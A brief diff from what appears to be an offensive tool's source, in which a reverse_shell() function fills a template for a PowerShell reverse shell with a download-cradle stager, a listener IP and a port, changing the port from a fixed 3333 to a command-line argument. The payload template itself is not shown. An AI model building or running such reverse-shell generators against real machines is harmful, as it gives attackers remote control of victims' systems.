@@ -260,7 +260,7 @@ def reverse_shell():
     context = {
         "dl_cradle": stager_str().replace('$K', '$R'),
         "IP": args.URI_HOST,
-        "PORT": "3333",
+        "PORT": str(args.REC_PORT),
     }
     result = render_template(
                     "reverse-shell.ps1",
